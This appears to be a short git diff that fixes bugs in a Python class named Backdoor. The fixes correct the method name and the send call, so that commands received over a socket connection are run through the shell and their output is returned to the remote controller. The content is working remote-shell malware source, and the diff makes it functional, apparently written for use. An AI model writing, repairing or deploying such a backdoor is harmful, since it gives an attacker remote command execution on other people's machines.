@@ -14,12 +14,12 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
-    def ryn(self):
+    def run(self):
         try:
             while True:
-                command = self.connection.recv(1024)     # listen port and waiting command
+                command = self.connection.recv(1024)
                 command_result = self.execute_system_command(command)
-                command.send(command_result)
+                self.connection.send(command_result)
                 self.connection.send("\n [+] Connetction esteblished")
 
         except KeyboardInterrupt:
@@ -31,5 +31,6 @@ if __name__ == "__main__":
     port: int
 
     backdoor = Backdoor(ip, port)
-    backdoor.run( )
+    backdoor.run()
+
 
